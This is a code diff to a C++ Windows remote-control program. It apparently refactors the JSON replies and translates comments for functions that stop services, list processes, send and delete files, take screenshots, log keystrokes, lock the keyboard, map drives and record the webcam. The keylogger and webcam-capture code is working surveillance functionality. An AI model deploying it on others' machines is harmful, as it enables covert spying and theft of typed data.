@@ -176,18 +176,18 @@ string stopService(string name) {
 
     json jsonResponse;
 
-    jsonResponse["title"] = STOP_SERVICE;
-    jsonResponse["nameObject"] = name;
-
     string checkCommand = "sc query " + name + " | find \"RUNNING\" > nul";
 
     if (result == 0) {
+        jsonResponse["status"] = "OK";
         jsonResponse["result"] = "Service " + name + " has been stopped successfully.";
     }
     else if (system(checkCommand.c_str()) != 0) {
+        jsonResponse["status"] = "OK";
         jsonResponse["result"] = "Service " + name + " is already stopped.";
     }
     else {
+        jsonResponse["status"] = "FAILED";
         jsonResponse["result"] = "Failed to stop service " + name + ". Please check the service status.";
     }
 
@@ -210,13 +210,13 @@ string getServiceDescription(SC_HANDLE hService) {
 }
 string truncateString(const string& str, size_t maxLength) {
     if (str.length() > maxLength) {
-        return str.substr(0, maxLength) + "...";  // Cắt chuỗi và thêm dấu ba chấm
+        return str.substr(0, maxLength) + "...";
     }
     return str;
 }
 string convertWideCharToString(LPCWSTR wideCharStr) {
     int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wideCharStr, -1, nullptr, 0, nullptr, nullptr);
-    string result(bufferSize - 1, 0); // bufferSize bao gồm ký tự null cuối
+    string result(bufferSize - 1, 0);
     WideCharToMultiByte(CP_UTF8, 0, wideCharStr, -1, &result[0], bufferSize, nullptr, nullptr);
     return result;
 }
@@ -233,7 +233,7 @@ vector<pair<string, tuple<int, string, string>>> listAllServices() {
     DWORD dwBufferSize = 0;
     LPBYTE lpBuffer = nullptr;
 
-    // Lấy kích thước bộ nhớ cần thiết
+    // get the required memory size
     EnumServicesStatusEx(
         hSCManager,
         SC_ENUM_PROCESS_INFO,
@@ -247,7 +247,7 @@ vector<pair<string, tuple<int, string, string>>> listAllServices() {
         nullptr
     );
 
-    // Cấp phát bộ nhớ
+    // allocate memory
     dwBufferSize = dwBytesNeeded;
     lpBuffer = new BYTE[dwBufferSize];
     if (!EnumServicesStatusEx(
@@ -268,29 +268,29 @@ vector<pair<string, tuple<int, string, string>>> listAllServices() {
         return servicesInfo;
     }
 
-    // Thu thập tên dịch vụ, PID, mô tả và trạng thái của các dịch vụ
+    // collect service names, PID, description, and status of the services
     auto* services = reinterpret_cast<LPENUM_SERVICE_STATUS_PROCESS>(lpBuffer);
     for (DWORD i = 0; i < dwServicesReturned; ++i) {
         string serviceName = convertWideCharToString(services[i].lpServiceName);
         int pid = services[i].ServiceStatusProcess.dwProcessId;
 
-        // Trạng thái dịch vụ
+        // service status
         string status = (services[i].ServiceStatusProcess.dwCurrentState == SERVICE_RUNNING) ? "Running" : "Stopped";
 
-        // Lấy mô tả dịch vụ
+        // get service description
         SC_HANDLE hService = OpenService(hSCManager, services[i].lpServiceName, SERVICE_QUERY_CONFIG);
         string description = getServiceDescription(hService);
         CloseServiceHandle(hService);
 
-        // Cắt ngắn tên dịch vụ và mô tả nếu quá dài
-        serviceName = truncateString(serviceName, 35);  // Cắt tên dịch vụ nếu quá 40 ký tự
-        description = truncateString(description, 35);  // Cắt mô tả nếu quá 40 ký tự
+        // truncate service name and description if too long
+        serviceName = truncateString(serviceName, 40);  // truncate service name if over 40 characters
+        description = truncateString(description, 40);  // truncate description if over 40 characters
 
-        // Thêm vào vector
+        // add to vector
         servicesInfo.push_back({ serviceName, make_tuple(pid, description, status) });
     }
 
-    // Dọn dẹp bộ nhớ
+    // clean up memory
     delete[] lpBuffer;
     CloseServiceHandle(hSCManager);
 
@@ -299,76 +299,70 @@ vector<pair<string, tuple<int, string, string>>> listAllServices() {
 void writeServiceListToFile(const vector<pair<string, tuple<int, string, string>>>& services) {
     ofstream outputFile(DATA_FILE);
 
-    if (!outputFile.is_open()) {
-        cerr << "Unable to open file for writing!" << endl;
-        return;
-    }
-
-    // Ghi tiêu đề cho các cột vào file
+    // write titles
     outputFile << left << setw(40) << "Name"
         << setw(10) << "PID"
         << setw(40) << "Description"
         << setw(15) << "Status" << endl;
     outputFile << string(100, '-') << endl;
 
-    // Ghi ra các dịch vụ và thông tin của chúng vào file
+    // write service informations
     for (const auto& service : services) {
         const auto& [name, serviceInfo] = service;
         const auto& [pid, description, status] = serviceInfo;
 
-        // Ghi thông tin theo đúng định dạng cột vào file
         outputFile << left << setw(40) << name
             << setw(10) << pid
             << setw(40) << description
             << setw(15) << status << endl;
     }
 
-    // Đóng file
     outputFile.close();
 }
-string listService() {
+json listService() {
     vector<pair<string, tuple<int, string, string>>> servicesList = listAllServices();
 
     json jsonResponse;
 
-    jsonResponse["title"] = "listServices";
-
     if (!servicesList.empty()) {
+		jsonResponse["status"] = "OK";
         jsonResponse["result"] = "Successfully listed services";
         writeServiceListToFile(servicesList);
     }
-    else jsonResponse["result"] = "Failed to list services";
+    else {
+		jsonResponse["status"] = "FAILED";
+        jsonResponse["result"] = "Failed to list services";
+    }
 
-    return jsonResponse.dump();
+    return jsonResponse;
 }
 
 // list process
-string listProcess() {
+json listProcess() {
     json jsonRespone;
-
-    jsonRespone["title"] = "listProcess";
 
     int result = system("tasklist > data.bin");
 
     if (result == 0) {
+		jsonRespone["status"] = "OK";
         jsonRespone["result"] = "Successfully listed process";
-
     }
     else {
+		jsonRespone["status"] = "FAILED";
         jsonRespone["result"] = "Failed to list services";
     }
 
-    return jsonRespone.dump();
+    return jsonRespone;
 }
 
 // get file
 bool sendFile(SOCKET& clientSocket, string fileName) {
     ifstream file(fileName, ios::binary);
 
-    if (!file) {
-        cout << "Failed to open file " << fileName << endl;
-        return false;
-    }
+	if (!file) {
+		cout << "Failed to open file: " << fileName << endl;
+		return false;
+	}
 
     string fileBuffer((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
 
@@ -399,24 +393,24 @@ string copyFile(const string& sourceFile, const string& destinationFile) {
 
     json jsonResponse;
 
-    jsonResponse["title"] = "Copy file";
-
     if (!source) {
-        cout << "hehe" << endl;
-        jsonResponse["result"] = "Source file does not exist or could not be opened!";
+		jsonResponse["status"] = "FAILED";
+        jsonResponse["result"] = "Source file does not exist or could not be opened";
         return jsonResponse.dump();
     }
 
     ofstream destination(destinationFile, ios::binary);
 
     if (!destination) {
-        jsonResponse["result"] = "Could not create destination file!";
+		jsonResponse["status"] = "FAILED";
+        jsonResponse["result"] = "Could not create destination file";
         return jsonResponse.dump();
     }
 
     destination << source.rdbuf();
 
-    jsonResponse["result"] = "File copied successfully!";
+	jsonResponse["status"] = "OK";
+    jsonResponse["result"] = "File copied successfully";
 
     return jsonResponse.dump();
 }
@@ -425,12 +419,12 @@ string copyFile(const string& sourceFile, const string& destinationFile) {
 string deleteFile(string& filePath) {
     json jsonResponse;
 
-    jsonResponse["title"] = DELETE_FILE;
-
     if (remove(filePath.c_str()) == 0) {
-        jsonResponse["result"] = "File has been successfully deleted!";
+		jsonResponse["status"] = "OK";
+        jsonResponse["result"] = "File has been successfully deleted";
     }
     else {
+		jsonResponse["status"] = "FAILED";
         jsonResponse["result"] = "Failed to delete file";
     }
 
@@ -487,7 +481,7 @@ bool saveScreenshotToFile(HBITMAP hBitmap, int width, int height) {
 
     ofstream outFile(fileName, ios::out | ios::binary);
     if (!outFile) {
-        cerr << "Error: Failed to save BMP file!" << endl;
+        cout << "Error: Failed to save BMP file" << endl;
         return false;
     }
 
@@ -506,59 +500,45 @@ bool saveScreenshotToFile(HBITMAP hBitmap, int width, int height) {
     cout << "Successfully saved the screenshot to the file:  " << fileName << endl;
     return true;
 }
-bool saveBinaryToImage(const string& binaryData, const string& savePath) {
-    // Mở tệp nhị phân để ghi dữ liệu vào tệp hình ảnh
-    ofstream outFile(savePath, ios::out | ios::binary);
-    if (!outFile) {
-        cerr << "Error: Cannot open file to save!" << endl;
-        return false;
-    }
-
-    // Ghi dữ liệu vào tệp
-    outFile.write(binaryData.c_str(), binaryData.size());
-    outFile.close();
-
-    cout << "Image has been saved to the file: " << savePath << endl;
-    return true;
-}
-void takeScreenshot() {
+bool takeScreenshot() {
     int screenWidth, screenHeight;
 
 	// capture screen
     HBITMAP hBitmap = captureScreen(screenWidth, screenHeight);
     if (!hBitmap) {
-        cout << "Failed to screenshot!";
-        return;
+        cout << "Failed to screenshot" << endl;
+        return false;
     }
 
 	// save to file screenshot.png
     if (!saveScreenshotToFile(hBitmap, screenWidth, screenHeight)) {
-        cout << "Failed to screenshot!" << endl;
+        cout << "Failed to screenshot" << endl;
         DeleteObject(hBitmap);
-        return;
+        return false;
     }
 
 	// release memory
     DeleteObject(hBitmap);
+    return true;
 }
 
 // keylogger
 map<int, string> createKeyMap() {
     map<int, string> keyMap;
 
-    // Các phím chữ cái
+	// alphabet keys
     for (char c = 'A'; c <= 'Z'; ++c) keyMap[c] = string(1, c);
 
-    // Các phím số
+	// number keys
     for (char c = '0'; c <= '9'; ++c) keyMap[c] = string(1, c);
 
-    // Các phím chức năng
+	// function keys
     keyMap[VK_F1] = "F1";    keyMap[VK_F2] = "F2";    keyMap[VK_F3] = "F3";
     keyMap[VK_F4] = "F4";    keyMap[VK_F5] = "F5";    keyMap[VK_F6] = "F6";
     keyMap[VK_F7] = "F7";    keyMap[VK_F8] = "F8";    keyMap[VK_F9] = "F9";
     keyMap[VK_F10] = "F10";  keyMap[VK_F11] = "F11";  keyMap[VK_F12] = "F12";
 
-    // Các phím điều khiển
+	// manipulation keys
     keyMap[VK_SHIFT] = "Shift";
     keyMap[VK_CONTROL] = "Ctrl";
     keyMap[VK_MENU] = "Alt";
@@ -572,13 +552,13 @@ map<int, string> createKeyMap() {
     keyMap[VK_LWIN] = "Left Windows";   // Left Windows Key
     keyMap[VK_RWIN] = "Right Windows";  // Right Windows Key
 
-    // Các phím mũi tên
+	// arrow keys
     keyMap[VK_LEFT] = "Left Arrow";
     keyMap[VK_RIGHT] = "Right Arrow";
     keyMap[VK_UP] = "Up Arrow";
     keyMap[VK_DOWN] = "Down Arrow";
 
-    // Các phím đặc biệt khác
+	// other keys
     keyMap[VK_DELETE] = "Delete";
     keyMap[VK_INSERT] = "Insert";
     keyMap[VK_HOME] = "Home";
@@ -586,7 +566,7 @@ map<int, string> createKeyMap() {
     keyMap[VK_PRIOR] = "Page Up";
     keyMap[VK_NEXT] = "Page Down";
 
-    // Các ký tự đặc biệt
+	// special characters
     keyMap[0xBD] = "-"; keyMap[0xBB] = "="; keyMap[0xDB] = "["; keyMap[0xDD] = "]";
     keyMap[0xDC] = "\\"; keyMap[0xBA] = ";"; keyMap[0xDE] = "'"; keyMap[0xBC] = ",";
     keyMap[0xBE] = "."; keyMap[0xBF] = "/"; keyMap[0xC0] = "`";
@@ -594,7 +574,7 @@ map<int, string> createKeyMap() {
     keyMap[0x34] = "4"; keyMap[0x35] = "5"; keyMap[0x36] = "6"; keyMap[0x37] = "7";
     keyMap[0x38] = "8"; keyMap[0x39] = "9";
 
-    // Các phím NumPad
+	// NumPad keys
     keyMap[VK_NUMPAD0] = "NumPad 0";
     keyMap[VK_NUMPAD1] = "NumPad 1";
     keyMap[VK_NUMPAD2] = "NumPad 2";
@@ -615,37 +595,38 @@ map<int, string> createKeyMap() {
     return keyMap;
 }
 vector<string> collectKeyNames(int durationInSeconds) {
-    map<int, string> keyMap = createKeyMap(); // Tạo bảng ánh xạ mã phím
-    vector<string> keyNames;  // Lưu trữ tên các phím đã nhấn
-    bool keyState[256] = { false }; // Trạng thái trước đó của các phím
 
-    auto startTime = GetTickCount64(); // Lấy thời gian bắt đầu (milliseconds)
+    map<int, string> keyMap = createKeyMap(); // create a key code mapping table
+    vector<string> keyNames;  // store the names of the pressed keys
+    bool keyState[256] = { false }; // previous state of the keys
+
+    auto startTime = GetTickCount64(); // get the start time (milliseconds)
     cout << "Started collecting keys (Duration: " << durationInSeconds << " seconds):" << endl;
 
     while ((GetTickCount64() - startTime) / 1000 < durationInSeconds) {
-        for (int key = 0; key < 256; ++key) { // Duyệt qua tất cả các mã phím
-            bool isPressed = GetAsyncKeyState(key) & 0x8000; // Kiểm tra nếu phím được nhấn
+        for (int key = 0; key < 256; ++key) {
+            bool isPressed = GetAsyncKeyState(key) & 0x8000; // check if the key is pressed
 
-            // Kiểm tra trạng thái phím điều khiển
-            if (key == VK_LBUTTON || key == VK_RBUTTON) continue;  // Bỏ qua phím chuột
+            // check control key states
+            if (key == VK_LBUTTON || key == VK_RBUTTON) continue;  // skip mouse buttons
 
-            if (isPressed && !keyState[key]) { // Nếu phím vừa được nhấn (chưa nhấn trước đó)
-                keyState[key] = true; // Cập nhật trạng thái
+            if (isPressed && !keyState[key]) { // if the key was just pressed (not pressed before)
+                keyState[key] = true; // update the state
 
-                if (keyMap.find(key) != keyMap.end()) { // Nếu mã phím có trong bảng ánh xạ
+                if (keyMap.find(key) != keyMap.end()) { // if the key code is in the mapping table
                     keyNames.push_back(keyMap[key]);
-                    cout << "Key pressed: " << keyMap[key] << endl;  // "Phím được nhấn"
+                    cout << "Key pressed: " << keyMap[key] << endl;
                 }
             }
-            else if (!isPressed) { // Nếu phím không còn nhấn
-                keyState[key] = false; // Reset trạng thái
+            else if (!isPressed) { // if the key is no longer pressed
+                keyState[key] = false; // reset the state
             }
         }
-        Sleep(10); // Giảm tải CPU
+        Sleep(10); // reduce CPU load
     }
 
-    cout << "Finished collecting keys!" << endl;  // "Kết thúc thu thập phím!"
-    return keyNames; // Trả về danh sách các phím đã nhấn
+    cout << "Finished collecting keys" << endl;
+    return keyNames;
 }
 void writeKeyNamesToFile(vector<string>& keyNames) {
     ofstream output(DATA_FILE);
@@ -656,28 +637,28 @@ void writeKeyNamesToFile(vector<string>& keyNames) {
 
     output.close();
 }
-string keylogger(int durationInSeconds) {
+json keylogger(int durationInSeconds) {
     json jsonResponse;
-
-    jsonResponse["title"] = "keyLogger";
 
     vector<string> keyNames = collectKeyNames(durationInSeconds);
 
     if (keyNames.size() == 0) {
+		jsonResponse["status"] = "FAILED";
         jsonResponse["result"] = "Failed to collect keys";
     }
     else {
+		jsonResponse["status"] = "OK";
         jsonResponse["result"] = "Key logger successfully";
         writeKeyNamesToFile(keyNames);
     }
 
-    return jsonResponse.dump();
+    return jsonResponse;
 }
 
 // lock keyboard
 LRESULT CALLBACK processLowLevelKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
-        return 1; // Chặn tất cả các phím bấm
+		return 1; // block the key
     }
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
@@ -701,13 +682,13 @@ bool lockKeyboard() {
 string lockKey(bool& flag) {
     json jsonResponse;
 
-    jsonResponse["title"] = "keyLocking";
-
     if (lockKeyboard()) {
+		jsonResponse["status"] = "OK";
         jsonResponse["result"] = "Successfully locked the keyboard";
         flag = true;
     }
     else {
+		jsonResponse["status"] = "FAILED";
         jsonResponse["result"] = "Failed to lock the key";
     }
 
@@ -742,12 +723,12 @@ bool unlockKeyboard() {
 string unlockKey() {
     json jsonResponse;
 
-    jsonResponse["title"] = "keyUnlocking";
-
     if (unlockKeyboard()) {
+		jsonResponse["status"] = "OK";
         jsonResponse["result"] = "Successfully unlocked the keyboard";
     }
     else {
+		jsonResponse["status"] = "FAILED";
         jsonResponse["result"] = "Failed to unlock the keyboard";
     }
 
@@ -783,20 +764,20 @@ bool isHiddenOrSystem(const filesystem::path& path) {
     return (attributes & FILE_ATTRIBUTE_HIDDEN) || (attributes & FILE_ATTRIBUTE_SYSTEM);
 }
 void printDirectoryTree(const filesystem::path& path, wofstream& output, int indent = 0, int currentDepth = 0, int maxDepth = 3) {
-    if (currentDepth > maxDepth) return; // Dừng nếu vượt quá mức tối đa
+    if (currentDepth > maxDepth) return; // stop if it exceeds the maximum depth
 
     try {
         for (const auto& entry : filesystem::directory_iterator(path)) {
-            // Bỏ qua tệp/thư mục ẩn hoặc hệ thống
+            // skip hidden or system files/folders
             if (isHiddenOrSystem(entry.path())) continue;
 
-            // Chuẩn bị chuỗi đầu ra
+            // prepare the output string
             wstring line = wstring(indent, L' ') + L"|-- " + entry.path().filename().wstring() + L"\n";
 
-            // Ghi vào tệp
+            // write to file
             output << line;
 
-            // Nếu là thư mục, tiếp tục đệ quy (nếu ở mức nhỏ hơn mức tối đa)
+            // if it's a directory, continue recursion (if at a level less than the maximum)
             if (filesystem::is_directory(entry.path()) && currentDepth < maxDepth) {
                 printDirectoryTree(entry.path(), output, indent + 4, currentDepth + 1, maxDepth);
             }
@@ -807,7 +788,7 @@ void printDirectoryTree(const filesystem::path& path, wofstream& output, int ind
     }
 }
 bool listDrivesAndPrintTree() {
-    // Cấu hình luồng ghi file với UTF-8
+    // configure file stream with UTF-8
     wofstream output(DATA_FILE, ios::out);
     output.imbue(locale("en_US.UTF-8"));
 
@@ -822,18 +803,18 @@ bool listDrivesAndPrintTree() {
         return false;
     }
 
-    // Ghi tiêu đề vào tệp
+    // write title to file
     output << L"This PC\n";
 
     for (char drive = 'A'; drive <= 'Z'; ++drive) {
         if (drives & (1 << (drive - 'A'))) {
-            // Tạo đường dẫn ổ đĩa
+            // create drive path
             wstring drivePath = wstring(1, drive) + L":\\";
 
-            // Ghi vào tệp
+            // write to file
             output << L"|-- Drive " + drivePath + L"\n";
 
-            // In thư mục con cấp 2
+            // print second-level subdirectories
             printDirectoryTree(drivePath, output, 4, 1, 3);
         }
     }
@@ -841,33 +822,31 @@ bool listDrivesAndPrintTree() {
     output.close();
     return true;
 }
-string listDirectoryTree() {
-    // Khai báo biến để lưu chế độ mặc định của stdout
-    int defaultMode = _O_TEXT; // Đảm bảo biến được khởi tạo đúng giá trị mặc định
+json listDirectoryTree() {
+    int defaultMode = _O_TEXT;
 
-    // Lưu chế độ hiện tại của stdout
     defaultMode = _setmode(_fileno(stdout), _O_U16TEXT);
     if (defaultMode == -1) {
-        cout << "Unable to switch output mode to Unicode. The program will continue with default settings.\n";
+        cout << "Unable to switch output mode to Unicode. The program will continue with default settings" << endl;
     }
 
     json jsonResponse;
-    jsonResponse["title"] = "getDirectoryTree";
 
-    // Liệt kê các ổ đĩa và ghi cây thư mục vào tệp
     if (listDrivesAndPrintTree()) {
-        jsonResponse["result"] = "Successfully created directory tree";
+		jsonResponse["status"] = "OK";
+        jsonResponse["result"] = "Successfully listed directory tree";
     }
     else {
-        jsonResponse["result"] = "Failed to create directory tree";
+		jsonResponse["status"] = "FAILED";
+        jsonResponse["result"] = "Failed to list directory tree";
     }
 
     // Khôi phục chế độ ban đầu của stdout
     if (_setmode(_fileno(stdout), defaultMode) == -1) {
-        cout << "Failed to restore default stdout mode.\n";
+        cout << "Failed to restore default stdout mode" << endl;
     }
 
-    return jsonResponse.dump();
+    return jsonResponse;
 }
 
 // webcam
@@ -876,29 +855,29 @@ thread webcamThread = thread();
 bool createWebcamVideo(int duration) {
     cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);
 
-    // Khởi tạo COM ở chế độ Multithreaded
+    // initialize COM in Multithreaded mode
     HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
     if (FAILED(hr)) {
         return false;
     }
 
-    // Mở camera
+    // open the camera
     cv::VideoCapture cap(0);
     if (!cap.isOpened()) {
         CoUninitialize();
         return false;
     }
 
-    // Lấy kích thước khung hình và các thông số
+    // get frame size and other parameters
     int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
     int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
     cv::Size frame_size(frame_width, frame_height);
     int fps = 30;
 
-    // Tạo VideoWriter với codec AVC1
-    string output_file = "output.mp4";
+    // create VideoWriter with AVC1 codec
+    string output_file = VIDEO_FILE;
     cv::VideoWriter video(output_file,
-        cv::VideoWriter::fourcc('a', 'v', 'c', '1'),  // Codec AVC1
+        cv::VideoWriter::fourcc('a', 'v', 'c', '1'),  // codec AVC1
         fps, frame_size, true);
 
     if (!video.isOpened()) {
@@ -907,12 +886,11 @@ bool createWebcamVideo(int duration) {
         return false;
     }
 
-    // Bắt đầu quay video
+    // start recording video
     cv::Mat frame;
     auto start_time = chrono::steady_clock::now();
     int elapsed_time = 0;
-    bool is_recording = true;  // Biến để xác định trạng thái ghi video
-
+    bool is_recording = true;  // variable to determine recording state
 
     while (isRecording) {
         cap >> frame;
@@ -920,34 +898,34 @@ bool createWebcamVideo(int duration) {
             break;
         }
 
-        // Nếu còn thời gian và đang quay, ghi video
+        // if still recording, write video
         if (is_recording) {
-            video.write(frame);  // Ghi khung hình vào file
+            video.write(frame);  // write frame to file
         }
 
-        // Hiển thị video
+        // display video
         cv::imshow("Video Recording", frame);
 
-        // Kiểm tra thời gian quay
+        // check recording time
         auto current_time = chrono::steady_clock::now();
         elapsed_time = (int)chrono::duration_cast<chrono::seconds>(current_time - start_time).count();
 
-        // Sau khi hết thời gian quay, dừng ghi nhưng vẫn tiếp tục nhận khung hình
+        // stop recording after the duration but continue capturing frames
         if (elapsed_time >= duration && is_recording) {
             is_recording = false;
             video.release();
         }
 
-        // Kiểm tra phím nhấn
+        // check for key press
         int key = cv::waitKey(1) & 0xFF;
 
-        // Kiểm tra nếu cửa sổ bị đóng
+        // check if window is closed
         if (cv::getWindowProperty("Video Recording", cv::WND_PROP_VISIBLE) < 1) {
             break;
         }
     }
 
-    // Dọn dẹp tài nguyên
+    // clean up resources
     cap.release();
     cv::destroyAllWindows();
     CoUninitialize();
@@ -955,44 +933,52 @@ bool createWebcamVideo(int duration) {
     return true;
 }
 string turnOnWebcam() {
+    json jsonResponse;
+
     if (isRecording) {
-        return R"({"title":"startWebcam","result":"Webcam is already recording"})";
+        jsonResponse["status"] = "FAILED";
+		jsonResponse["result"] = "Failed to turn on webcam. Webcam is already on";
+
+        return jsonResponse.dump();
     }
 
     isRecording = true;
     webcamThread = thread([]() {
-        bool result = createWebcamVideo(10); // Quay video trong 10 giây
+		bool result = createWebcamVideo(10); // record for 10 seconds
         });
-    json jsonResponse;
 
-    jsonResponse["title"] = "startWebcam";
-
-    jsonResponse["result"] = "Successfully started webcam";
+	jsonResponse["status"] = "OK";
+    jsonResponse["result"] = "Successfully turned on webcam";
 
     return jsonResponse.dump();
 }
-string turnOffWebcam() {
+json turnOffWebcam() {
+    json jsonResponse;
+
     if (!isRecording) {
-        return R"({"title":"stopWebcam","result":"Webcam is not recording"})";
+        jsonResponse["status"] = "FAILED";
+        jsonResponse["result"] = "Failed to turn off webcam. Webcam is already off";
+
+        return jsonResponse;
     }
 
-    isRecording = false; // Yêu cầu dừng quay video
+	isRecording = false; // stop recording
 
     if (webcamThread.joinable()) {
-        webcamThread.join(); // Chờ thread webcam hoàn thành
+		webcamThread.join(); // wait for the thread to finish
     }
     string command = "powershell -Command \"Get-Process| Where-Object { $_.Name -eq 'WindowsCamera' } | Stop-Process\"";
     int result = system(command.c_str());
 
-    json jsonResponse;
+    if (result == 0) {
+		jsonResponse["status"] = "OK";
+        jsonResponse["result"] = "Successfully turned off webcam";
+    }
+    else {
+		jsonResponse["status"] = "FAILED";
+        jsonResponse["result"] = "Failed to turn off webcam";
+    }
 
-    jsonResponse["title"] = "stopWebcam";
-
-    if (result == 0)
-        jsonResponse["result"] = "Successfully stopped webcam";
-    else
-        jsonResponse["result"] = "Failed to stop webcam";
-
-    return jsonResponse.dump();
+    return jsonResponse;
 }
 
